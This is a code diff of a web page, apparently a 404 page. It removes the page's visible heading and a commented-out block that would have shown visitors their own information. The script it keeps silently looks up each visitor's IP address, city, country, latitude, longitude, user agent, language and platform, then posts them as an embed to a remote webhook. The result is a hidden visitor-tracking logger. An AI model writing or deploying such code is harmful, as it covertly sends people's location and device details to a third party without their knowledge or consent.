@@ -10,27 +10,7 @@
 
     <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 
-    <h1>404 I think you meant to go to https://soulsender.me</h1>
-    
-    <!--
-    <div class="button-div">
-        <button onclick="reveal()">Or is it?</button>
-    </div>
-
-    <div id="hidden-info">
-        <p id="ip-p"></p>
-        <p id="ipapi-city"></p>
-        <p id="ipapi-country"></p>
-        <p id="ipapi-timezone"></p>
-        <p id="ipapi-lat"></p>
-        <p id="ipapi-long"></p>
-        <p id="ua-p"></p>
-        <p id="lang-p"></p>
-        
-    </div>
-    -->
     <script>
-        //document.getElementById('hidden-info').style.visibility = 'hidden';
 
         $.getJSON("https://api.ipify.org?format=json", function(data) {
             $.getJSON("https://ipapi.co/" + data.ip + "/json/", function(ipapi) {
@@ -53,18 +33,8 @@
                 embeds: [{title: "User Logged on `" + cDay + "/" + cMonth + "/" + cYear + " | " + cHour + ":" + cMin + ":" + cSec + "`", color: 1752220,
                 description: "**IP: **`" + data.ip + "`" + "\n**Language: **`" + navigator.language + "`" + "\n**User Agent: **`" +  navigator.userAgent + "`" + "\n\n**OS: **` " + navigator.platform + "`" + "\n**Webdriver: **`" + navigator.webdriver + "`" + "\n**Version: **`" + navigator.appVersion + "`" + "\n**Country: **`" + ipapi.country_name + "`" + "\n**City: **`" + ipapi.city + "`" + "\n**Latitude: **`" + ipapi.latitude + "`" + "\n**Longitude: **`" + ipapi.longitude + "`"}]}
                 request.send(JSON.stringify(params));
-
             })
-            //document.getElementById('ip-p').innerHTML = data.ip;
-            //document.getElementById('ua-p').innerHTML = navigator.userAgent;
-            //document.getElementById('lang-p').innerHTML = navigator.language;
         })
-
-        
-
-        //function reveal() {
-        //    document.getElementById('hidden-info').style.visibility = 'visible';
-        //}
     </script>
 
 </body>
